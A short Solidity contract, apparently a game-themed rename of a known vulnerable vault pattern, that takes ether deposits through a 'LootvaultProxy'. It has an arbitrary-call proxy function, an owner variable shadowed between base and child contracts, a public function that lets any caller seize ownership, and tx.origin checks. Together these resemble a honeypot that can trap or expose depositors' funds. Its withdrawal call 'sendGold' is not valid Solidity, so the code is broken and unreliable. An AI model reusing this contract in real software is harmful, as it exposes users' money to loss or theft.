pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyGamemaster { if (msg.sender == Gamemaster) _; } address Gamemaster = msg.sender;
    function giveitemsGuildleader(address _gamemaster) public onlyGamemaster { Gamemaster = _gamemaster; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract LootvaultProxy is Proxy {
    address public Gamemaster;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function GoldVault() public payable {
        if (msg.sender == tx.origin) {
            Gamemaster = msg.sender;
            storeLoot();
        }
    }

    function storeLoot() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function retrieveItems(uint256 amount) public onlyGamemaster {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.sendGold(amount);
        }
    }
}